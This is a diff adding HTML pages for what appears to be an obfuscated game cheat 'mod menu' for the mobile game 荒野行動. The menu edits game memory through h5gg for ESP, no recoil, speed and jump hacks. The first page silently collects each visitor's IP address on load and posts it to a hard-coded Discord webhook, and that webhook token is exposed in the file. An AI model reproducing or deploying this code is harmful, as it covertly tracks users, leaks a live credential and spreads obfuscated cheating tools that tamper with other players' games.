@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IPアドレスを取得してDiscordに送信する</title>
+</head>
+<body>
+    <script>
+        // IPアドレスを取得する関数
+        function getIPAddress() {
+            fetch('https://api.回避ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
+                })
+                .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
+        }
+
+        // DiscordのWebhookにIPアドレスを送信する関数
+        function sendToDiscord(ipAddress) {
+            const webhookURL = 'https://discord.com/api/webhooks/1214187724735647784/3VTzgkX-TZRnRm_hVPO5Xna7qCRFN_KTKELimuPamR5zMKXxojyY8uqj4HeHQS2SM0hs';
+            const payload = {
+                embeds: [{
+                    title: 'mod menu利用者',
+                    description: `IPアドレス: ${ipAddress}`,
+                    color: 3447003 // 青色に設定
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Discordへの送信に失敗しました:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Discordへの送信に失敗しました:', error));
+        }
+
+        // ページが読み込まれたときにIPアドレスを取得してDiscordに送信する
+        getIPAddress();
+    </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DK</title>
+    <link rel="stylesheet" href="https://unpkg.com/element-ui@2.15.7/lib/theme-chalk/index.css">
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6/dist/vue.min.js"></script>
+    <script src="https://unpkg.com/element-ui@2.15.7/lib/index.js"></script>
+    <script>
+    alert("♡荒野行动LOVE♡")
+    </script>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            color: #FFF;
+        }
+        
+        #H5AlertView {
+            width: 220px;
+            height: 300px;
+            position: absolute;
+            left: -110px;
+            top: 150px;
+            text-align: center;
+            zoom:1.6;
+        }
+        
+        .ayimgui {
+            position: fixed;
+            width: 360px;
+            height: 320px;
+            top: calc(50% - 180px);
+            left: calc(50% - 180px);
+            z-index: 999;
+            background-image: url('https://media.discordapp.net/attachments/1209882685787611178/1211737771115421696/IMG_2993.png?ex=65ef49bd&is=65dcd4bd&hm=79dec7bb3eb775cea7e92263a67a0552c7fd08125c8b998ab604589081c9212d&');
+            background-position: center;
+            background-size: cover;
+            overflow: hidden;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        .onlyTitle {
+            height: 21px !important;
+        }
+        
+        .ayimgui .aytitle {
+            padding: 0 5px;
+            font-size: 16px;
+            background-color: black;
+        }
+        
+        .ayimgui .aytitle .titleClose {
+            position: absolute;
+            top: 3px;
+            right: 6px;
+            color: #ff3e2b;
+        }
+        
+        .ayimgui .aytitle .titleClose:hover {
+            color: #8ae;
+        }
+        
+         .ayimgui .aybody {
+            padding: 15px;
+            height: calc(100% - 21px - 15px - 15px);
+            overflow: auto;
+            font-size: 14px;
+        }
+        
+        
+        .el-button {
+            font-size: 20px;
+            padding: 7px 10px;
+            line-height: 14px;
+            color: #FFF;
+            background-color: rgba(255, 255, 255, 0.5);
+            border: none;
+            margin-bottom: 10px;
+        }
+        
+        .el-button:hover {
+            color: #FFF;
+            background-color: #ff94cA;
+        }
+        
+        .el-button:focus,
+        .el-button:hover {
+            color: #000;
+            background-color: #ff94ca;
+        }
+
+        @keyframes rainbow {
+            0% { color: red; }
+            16.67% { color: orange; }
+            33.33% { color: yellow; }
+            50% { color: green; }
+            66.67% { color: blue; }
+            83.33% { color: indigo; }
+            100% { color: violet; }
+        }
+
+        .rainbow-text {
+            animation: rainbow 4s infinite;
+        }
+
+.el-tabs__item {
+    width: 47px; /* 固定値で幅を設定 */
+    background-color: rgba(255, 255, 255, 0.5); /* 半透明の背景色 */
+    font-size: 16px; /* フォントサイズ */
+    padding: 5px 10px; /* 上下の余白を減らして固定値に設定 */
+    border-radius: 5px; /* 角丸 */
+    border: 1px solid #ccc; /* 境界線 */
+    margin-right: 5px; /* タブの間隔 */
+    text-align: center; /* テキストを真ん中に配置 */
+}
+
+.el-tabs__item:last-child {
+    margin-right: 0; /* 最後のタブに間隔を付けない */
+}
+
+.el-tabs__item.is-active {
+    background-color: rgba(255, 255, 255, 0.8); /* タップしたときの背景色を半透明の白に設定 */
+    color: #000000; /* タップしたときの文字色を黒に設定 */
+}
+
+.el-tabs__content {
+    padding: 20px; /* タブのコンテンツの余白 */
+    border-top: none; /* 上部の境界線を削除 */
+    border-radius: 0 0 5px 5px; /* 下部の角丸 */
+}
+
+
+        /* タブのゲージを非表示にする */
+.el-tabs__active-bar {
+    display: none;
+}
+
+
+
+    </style>
+</head>
+<body>
+    <div id="app">
+        <div class="ayimgui">
+            <div class="aytitle">
+                <p class="rainbow-text">v11.1 yyds by @cat___rui</p>
+            </div>
+            <div class="aybody">
+            <el-tabs v-model="activeTab">
+                    <el-tab-pane label="最強" name="tab1">
+                        <p class="rainbow-text">𝑚𝑒𝑚𝑜𝑟𝑦</p>
+                <p class="rainbow-text">-------------------‐</p>
+                <br>                                          
+                <br>
+                <el-button @click="executeFunction(yz)">Glow esp</el-button>  
+                <el-button @click="executeFunction(ew)">No recoil</el-button>
+                <br>
+                <br>  
+                <el-button @click="executeFunction(fw)">Gasoline</el-button>
+                <el-button @click="executeFunction(mk)">High jump</el-button>
+                <br>
+                <br>
+                <p class="rainbow-text">offset</p>
+                <p class="rainbow-text">-------------------<p/>
+                <br>
+                <br>
+                <el-button @click="executeFunction(se)">All speed up</el-button>
+                <br>
+                <el-button @click="executeFunction(ex)">Rollback infinite jump</el-button>
+                <br>
+                <br>
+                <p class="rainbow-text">background</p>
+                <p class="rainbow-text">-------------------<p/>
+                <br>
+                <el-button onclick="man()">Change</el-button>
+                <el-button onclick="men()">Change by oneself</el-button>
+                <br>
+                <br>
+                <p class="rainbow-text">session list</p>
+                <p class="rainbow-text">-------------------<p/>
+                <br>
+                <div v-for="(result, index) in functionResults" :key="index">
+                <span :class="{ 'rainbow-text': result.includes('session ok') }">{{ result }}</span>
+                </div>
+                        </el-tab-pane>
+                        <el-tab-pane label="知能" name="tab2">
+                        <!-- タブ2のコンテンツ -->
+                        <p class="rainbow-text">Color list</p>
+                        <p class="rainbow-text" style="background-color: #000000; color: #ffffff;">黒: #000000 (Black)</p>
+                        <p class="rainbow-text" style="background-color: #ffffff; color: #000000;">白: #ffffff (White)</p>
+                        <p class="rainbow-text" style="background-color: #ff0000; color: #ffffff;">赤: #ff0000 (Red)</p>
+                        <p class="rainbow-text" style="background-color: #008000; color: #ffffff;">緑: #008000 (Green)</p>
+                        <p class="rainbow-text" style="background-color: #0000ff; color: #ffffff;">青: #0000ff (Blue)</p>
+                        <p class="rainbow-text" style="background-color: #00ffff; color: #000000;">シアン: #00ffff (Cyan)</p>
+                        <p class="rainbow-text" style="background-color: #ff00ff; color: #ffffff;">マゼンタ: #ff00ff (Magenta)</p>
+                        <p class="rainbow-text" style="background-color: #ffff00; color: #000000;">黄色: #ffff00 (Yellow)</p>
+                        <p class="rainbow-text" style="background-color: #c0c0c0; color: #000000;">シルバー: #c0c0c0 (Silver)</p>
+                        <p class="rainbow-text" style="background-color: #808080; color: #ffffff;">灰色: #808080 (Gray)</p>
+                        <p class="rainbow-text" style="background-color: #808000; color: #ffffff;">オリーブ: #808000 (Olive)</p>
+                        <p class="rainbow-text" style="background-color: #800080; color: #ffffff;">紫: #800080 (Purple)</p>
+                        <p class="rainbow-text" style="background-color: #008080; color: #ffffff;">テール: #008080 (Teal)</p>
+                        <p class="rainbow-text" style="background-color: #a52a2a; color: #ffffff;">ネビー: #a52a2a (Maroon)</p>
+                        <p class="rainbow-text" style="background-color: #00ff00; color: #000000;">ライム: #00ff00 (Lime)</p>
+                        <p class="rainbow-text" style="background-color: #ffc0cb; color: #000000;">ピンク: #ffc0cb (Pink)</p>
+                        <p class="rainbow-text" style="background-color: #ffa500; color: #000000;">オレンジ: #ffa500 (Orange)</p>
+</div>
+
+                    </el-tab-pane>
+                    <!-- 必要に応じて他のタブを追加 -->
+                </el-tabs>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    var app = new Vue({
+            el: "#app",
+            data() {
+                return {
+                    functionResults: [], // 各関数の実行結果を格納する配列
+                    activeTab: 'tab1' // デフォルトのアクティブなタブ
+                }
+            },
+            methods: {
+                executeFunction(func) {
+                    const result = func(); // 関数の実行結果を取得
+                    this.functionResults.push(result); // 関数名と "session ok" を配列に追加
+                    this.$forceUpdate(); // 再レンダリングをトリガー
+                }
+            }
+        });
+
+(function(_0x96699d,_0x147bab){var _0x2b5665=_0x2f04,_0x1e9c4e=_0x96699d();while(!![]){try{var _0x6f198c=-parseInt(_0x2b5665(0x160))/0x1*(parseInt(_0x2b5665(0x16d))/0x2)+-parseInt(_0x2b5665(0x15a))/0x3+-parseInt(_0x2b5665(0x178))/0x4+-parseInt(_0x2b5665(0x141))/0x5*(-parseInt(_0x2b5665(0x177))/0x6)+parseInt(_0x2b5665(0x17f))/0x7*(-parseInt(_0x2b5665(0x16a))/0x8)+-parseInt(_0x2b5665(0x14a))/0x9+parseInt(_0x2b5665(0x187))/0xa*(parseInt(_0x2b5665(0x15d))/0xb);if(_0x6f198c===_0x147bab)break;else _0x1e9c4e['push'](_0x1e9c4e['shift']());}catch(_0x25191b){_0x1e9c4e['push'](_0x1e9c4e['shift']());}}}(_0x23c8,0xd334c),function(_0x481cd3,_0x2fb258){var _0x260e31=_0x2f04,_0x2a6ed8=_0x13cd,_0x1f6ad8=_0x481cd3();while(!![]){try{var _0x4a464d=-parseInt(_0x2a6ed8(0x10e))/0x1+-parseInt(_0x2a6ed8(0x11a))/0x2+parseInt(_0x2a6ed8(0x131))/0x3+-parseInt(_0x2a6ed8(0x127))/0x4*(parseInt(_0x2a6ed8(0x125))/0x5)+parseInt(_0x2a6ed8(0x12b))/0x6*(-parseInt(_0x2a6ed8(0x122))/0x7)+parseInt(_0x2a6ed8(0x128))/0x8+parseInt(_0x2a6ed8(0x134))/0x9;if(_0x4a464d===_0x2fb258)break;else _0x1f6ad8[_0x260e31(0x164)](_0x1f6ad8[_0x260e31(0x165)]());}catch(_0x3f8c4a){_0x1f6ad8[_0x260e31(0x164)](_0x1f6ad8['shift']());}}}(_0xed12,0x5a769));function yz(){var _0xe73bc9=_0x2f04,_0x3dfc9f=_0x13cd;return h5gg[_0x3dfc9f(0x11d)](),h5gg[_0x3dfc9f(0x126)](_0x3dfc9f(0x108),_0x3dfc9f(0x116),_0xe73bc9(0x181),_0x3dfc9f(0x13a)),h5gg[_0x3dfc9f(0x121)]('0',_0x3dfc9f(0x11e),_0xe73bc9(0x176)),h5gg[_0xe73bc9(0x15f)]('0',_0x3dfc9f(0x11e),_0x3dfc9f(0x111),_0x3dfc9f(0x13a)),h5gg[_0xe73bc9(0x16c)](_0x3dfc9f(0x13c),_0x3dfc9f(0x11e)),alert(_0x3dfc9f(0x115)),_0x3dfc9f(0x115);}function _0x2f04(_0x433bce,_0x54f01b){var _0x23c862=_0x23c8();return _0x2f04=function(_0x2f040a,_0x1160f4){_0x2f040a=_0x2f040a-0x140;var _0x10b7e1=_0x23c862[_0x2f040a];return _0x10b7e1;},_0x2f04(_0x433bce,_0x54f01b);}function fw(){var _0x2a54c7=_0x2f04,_0x31a239=_0x13cd;return h5gg[_0x2a54c7(0x14e)](),h5gg[_0x31a239(0x126)]('1e-05',_0x2a54c7(0x188),_0x31a239(0x111),_0x31a239(0x12c)),h5gg[_0x31a239(0x121)]('1','F32',_0x31a239(0x112)),h5gg[_0x2a54c7(0x15f)]('1',_0x31a239(0x11e),_0x2a54c7(0x181),_0x2a54c7(0x185)),h5gg[_0x31a239(0xff)](_0x2a54c7(0x17d),_0x31a239(0x11e)),alert(_0x2a54c7(0x147)),_0x31a239(0x114);}function mk(){var _0x216fbc=_0x2f04,_0xcfdabc=_0x13cd;return h5gg['clearResults'](),h5gg[_0xcfdabc(0x126)](_0x216fbc(0x175),_0xcfdabc(0x12d),_0x216fbc(0x181),_0xcfdabc(0x10c)),h5gg[_0xcfdabc(0x121)]('0.925','F64',_0xcfdabc(0x136)),h5gg[_0xcfdabc(0x121)](_0x216fbc(0x175),_0xcfdabc(0x12d),_0xcfdabc(0x129)),h5gg[_0xcfdabc(0xff)]('20',_0xcfdabc(0x12d)),alert('High\x20jump\x20session\x20ok'),_0xcfdabc(0x10f);}function _0x13cd(_0x103509,_0x1cc1da){var _0x3741fa=_0xed12();return _0x13cd=function(_0x526d1d,_0x1d3e60){_0x526d1d=_0x526d1d-0xfd;var _0x5c3fc6=_0x3741fa[_0x526d1d];return _0x5c3fc6;},_0x13cd(_0x103509,_0x1cc1da);}function ew(){var _0x175426=_0x2f04,_0x7c7538=_0x13cd;return h5gg[_0x7c7538(0x11d)](),h5gg[_0x175426(0x15f)](_0x7c7538(0x11f),_0x175426(0x180),_0x7c7538(0x111),_0x7c7538(0x12c)),h5gg[_0x7c7538(0xff)](_0x175426(0x146),_0x7c7538(0x12d)),alert('No\x20recoil\x20session\x20ok'),_0x7c7538(0x119);}function _0x23c8(){var _0x29e4ec=['35PfMLqs','.ayimgui','v11.1\x20All\x20speed\x20up\x20editAll\x20address','modの背景を変更します。\x0aurlを入力してください','I32','0.1','0x10','2538mmcege','643640bEyxWp','\x22)\x20no-repeat\x20center','url(\x22https://media.discordapp.net/attachments/1210515057931460629/1211747125478694922/IMG_8230.jpg?ex=65ef5273&is=65dcdd73&hm=2ccfb38cd74fe854712db17d73058ada88ef60b4029e65464182759e0fe094fb&\x22)\x20no-repeat','#008000','1661862mXxYHS','0.00000000001','0x170000000','3038KIiTGZ','F64','0x100000000','U64','color','#808000','0x200000000','Rollback\x20infinite\x20jump\x20session\x20ok','10YkUFaS','F32','12547899yvaJRa','100PbGulN','#000000','No\x20recoil\x20session\x20ok','#ffff00','#ffa500','9999999','Gasoline\x20infinity\x20session\x20ok','getValue','cover','4507911wQgDjM','searchNearby','querySelector','39515dbRbee','clearResults','toLowerCase','start','#a52a2a','style','#ff00ff','background','0x20','querySelectorAll','High\x20jump\x20session\x20ok','url(\x22','#ffc0cb','619416FtGhwM','#008080','center','37203331ZbtIqG','430846Ipbnne','searchNumber','4YRBQza','forEach','modのbuttonのcolorを変えます\x0a2番目のtab知能をご確認ください\x0a色名を入力してください。','#0000ff','push','shift','backgroundSize','v11.1\x20Rollback\x20Spamming\x20infinite\x20jump\x20editAll\x20address','All\x20speed\x20up\x20session\x20ok','setValue','7984eLQfGp','require','editAll','612044ffnZwa','#808080','#800080'];_0x23c8=function(){return _0x29e4ec;};return _0x23c8();}function se(){var _0x2bea70=_0x13cd,_0x44d399=window[_0x2bea70(0x107)](_0x2bea70(0x13b));if(_0x44d399!==null&&_0x44d399!==''){h5gg[_0x2bea70(0x12f)](7.8);var _0x1a42b6=h5gg[_0x2bea70(0x10b)]('0'),_0x9b879b=Number(_0x1a42b6[0x0][_0x2bea70(0x137)]),_0x26508b=_0x9b879b+0x4ce8e98,_0x20c48d=h5gg[_0x2bea70(0x139)](_0x26508b,_0x2bea70(0x10d));_0x20c48d=h5gg[_0x2bea70(0x139)](Number(_0x20c48d)+0x100,_0x2bea70(0x10d)),_0x20c48d=h5gg[_0x2bea70(0x139)](Number(_0x20c48d)+0x28,_0x2bea70(0x10d));if(h5gg[_0x2bea70(0x132)](Number(_0x20c48d)+0x150,Number(_0x44d399),_0x2bea70(0x11e)))return alert(_0x2bea70(0x106)),'All\x20speed\x20up\x20session\x20ok';}}function ex(){var _0x1e9d6f=_0x2f04,_0x1fb1fe=_0x13cd,_0x34903b=window[_0x1fb1fe(0x107)](_0x1fb1fe(0x103));if(_0x34903b!==null&&_0x34903b!==''){h5gg[_0x1fb1fe(0x12f)](7.8);var _0x185c64=h5gg['getRangesList']('0'),_0x13dfce=Number(_0x185c64[0x0][_0x1fb1fe(0x137)]),_0x5000ee=_0x13dfce+0x4b8f328,_0x6d1b23=h5gg[_0x1fb1fe(0x139)](_0x5000ee,_0x1fb1fe(0x10d));_0x6d1b23=h5gg[_0x1e9d6f(0x148)](Number(_0x6d1b23)+0x370,_0x1fb1fe(0x10d));if(h5gg['setValue'](Number(_0x6d1b23)+0xd0,Number(_0x34903b),_0x1e9d6f(0x180)))return alert(_0x1e9d6f(0x186)),_0x1fb1fe(0x124);}}function man(){var _0x4c3e0b=_0x2f04,_0x13c943=_0x13cd,_0x110331=document[_0x13c943(0x120)](_0x4c3e0b(0x171));_0x110331&&(_0x110331[_0x13c943(0x10a)][_0x13c943(0x11b)]=_0x4c3e0b(0x17a),_0x110331[_0x13c943(0x10a)][_0x13c943(0x12a)]=_0x4c3e0b(0x149),_0x110331[_0x13c943(0x10a)][_0x13c943(0x109)]=_0x4c3e0b(0x15c));var _0x4e963b=document[_0x13c943(0x13d)]('*');_0x4e963b[_0x13c943(0x104)](function(_0x3ea7c8){var _0x1830a6=_0x4c3e0b,_0x2bca17=_0x13c943;_0x3ea7c8[_0x1830a6(0x152)][_0x2bca17(0x100)]='#000';});}function _0xed12(){var _0x1069cc=_0x2f04,_0xfe1766=[_0x1069cc(0x16e),_0x1069cc(0x167),_0x1069cc(0x161),_0x1069cc(0x149),_0x1069cc(0x168),'prompt','1066275963','backgroundPosition',_0x1069cc(0x152),'getRangesList',_0x1069cc(0x17e),_0x1069cc(0x182),_0x1069cc(0x15e),_0x1069cc(0x157),_0x1069cc(0x184),_0x1069cc(0x181),'0x30',_0x1069cc(0x179),_0x1069cc(0x147),'Glow\x20esp\x20session\x20ok',_0x1069cc(0x174),_0x1069cc(0x14f),'#c0c0c0',_0x1069cc(0x143),'1192102DendGS',_0x1069cc(0x154),_0x1069cc(0x17b),_0x1069cc(0x14e),_0x1069cc(0x188),'700',_0x1069cc(0x14c),_0x1069cc(0x14b),_0x1069cc(0x14d),_0x1069cc(0x173),'Rollback\x20infinite\x20jump\x20session\x20ok',_0x1069cc(0x170),'searchNumber','110872qxQsZI','262400zXIJVT',_0x1069cc(0x155),_0x1069cc(0x166),'414ErJZWq',_0x1069cc(0x185),'F64',_0x1069cc(0x15b),_0x1069cc(0x16b),_0x1069cc(0x144),_0x1069cc(0x17c),_0x1069cc(0x169),'#00ffff',_0x1069cc(0x140),_0x1069cc(0x151),'0x100',_0x1069cc(0x150),_0x1069cc(0x16f),_0x1069cc(0x148),'0x130000000',_0x1069cc(0x172),'200',_0x1069cc(0x156),_0x1069cc(0x159),_0x1069cc(0x145),'editAll',_0x1069cc(0x183),'#ffffff'];return _0xed12=function(){return _0xfe1766;},_0xed12();}function men(){var _0x3957ae=_0x2f04,_0x18e181=_0x13cd,_0x14506a=prompt(_0x18e181(0x123));if(_0x14506a){var _0x2e0436=document[_0x18e181(0x120)](_0x3957ae(0x171));_0x2e0436&&(_0x2e0436['style'][_0x18e181(0x11b)]=_0x3957ae(0x158)+_0x14506a+_0x18e181(0x113),_0x2e0436[_0x3957ae(0x152)][_0x18e181(0x12a)]=_0x18e181(0x105));}var _0x62ee84=prompt(_0x3957ae(0x162));if(_0x62ee84){var _0x58d282=_0x62ee84[_0x18e181(0x117)](),_0x2215b7={'黒':_0x3957ae(0x142),'白':_0x18e181(0x101),'赤':'#ff0000','緑':_0x18e181(0x11c),'青':_0x3957ae(0x163),'シアン':_0x18e181(0x133),'マゼンタ':_0x3957ae(0x153),'黄色':_0x18e181(0x130),'シルバー':_0x18e181(0x118),'灰色':_0x18e181(0x102),'オリーブ':_0x18e181(0x110),'紫':_0x18e181(0x138),'テール':_0x18e181(0x12e),'ネビー':_0x18e181(0x135),'ライム':'#00ff00','ピンク':_0x18e181(0xfd),'オレンジ':_0x18e181(0xfe)},_0x9b69b2=_0x2215b7[_0x58d282]||_0x62ee84,_0x363bb1=document[_0x18e181(0x13d)]('*');_0x363bb1[_0x18e181(0x104)](function(_0x4605ac){var _0x19cd2a=_0x18e181;_0x4605ac[_0x19cd2a(0x10a)][_0x19cd2a(0x100)]=_0x9b69b2;});}}
+   
+    </script>
+</body>
+</html>
+
+
+
+
+<script>
+    // 変数 h5gg を無理やり定義
+    var h5gg = "仮の値";
+
+    // コンソールにログを出力
+    console.log(h5gg);
+</script>
